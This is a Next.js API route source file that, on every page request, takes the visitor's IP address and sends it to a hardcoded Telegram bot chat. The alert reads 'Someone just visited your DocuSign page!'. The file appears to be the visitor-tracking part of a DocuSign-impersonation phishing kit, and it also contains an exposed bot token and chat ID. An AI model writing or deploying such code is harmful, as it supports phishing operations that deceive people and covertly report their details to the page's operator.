/** @format */

// app/api/sendemail/route.js
import TelegramBot from 'node-telegram-bot-api';

const botToken = "7485493379:AAH7TR0hQR3cUuNS1RC54YzwKFoz3qH2q8Y";
const chatId = "6191191290";
const bot = new TelegramBot(botToken);

// Function to get client IP address
function getClientIP(req) {
  // Try multiple headers to get the real IP
  const forwarded = req.headers.get('x-forwarded-for');
  const realIP = req.headers.get('x-real-ip');
  const cfConnectingIP = req.headers.get('cf-connecting-ip');
  
  if (forwarded) {
    return forwarded.split(',')[0].trim();
  }
  if (cfConnectingIP) {
    return cfConnectingIP;
  }
  if (realIP) {
    return realIP;
  }
  
  return 'Unknown IP';
}

// Handle POST requests
export async function POST(req) {
  try {
    const clientIP = getClientIP(req);
    
    // Send telegram notification with IP
    await bot.sendMessage(
      chatId, 
      `🔔 Someone just visited your DocuSign page!\nIP: ${clientIP}`
    );

    // Log success message to console
    console.log(`Visit notification sent to telegram successfully from IP: ${clientIP}`);

    return new Response(
      JSON.stringify({ message: "Notification sent successfully!" }),
      {
        status: 200,
        headers: { "Content-Type": "application/json" },
      }
    );
  } catch (error) {
    console.error("Error sending notification:", error);
    return new Response(JSON.stringify({ error: "Error sending notification" }), {
      status: 500,
      headers: { "Content-Type": "application/json" },
    });
  }
}

// Handle GET requests (for access notifications)
export async function GET(req) {
  try {
    const clientIP = getClientIP(req);
    
    // Send telegram notification for page access with IP
    await bot.sendMessage(
      chatId, 
      `🔔 Someone just visited your DocuSign page!\nIP: ${clientIP}`
    );

    // Log success message to console
    console.log(`Page access notification sent to telegram successfully from IP: ${clientIP}`);

    return new Response(
      JSON.stringify({ message: "Access notification sent successfully!" }),
      {
        status: 200,
        headers: { "Content-Type": "application/json" },
      }
    );
  } catch (error) {
    console.error("Error sending access notification:", error);
    return new Response(JSON.stringify({ error: "Error sending access notification" }), {
      status: 500,
      headers: { "Content-Type": "application/json" },
    });
  }
}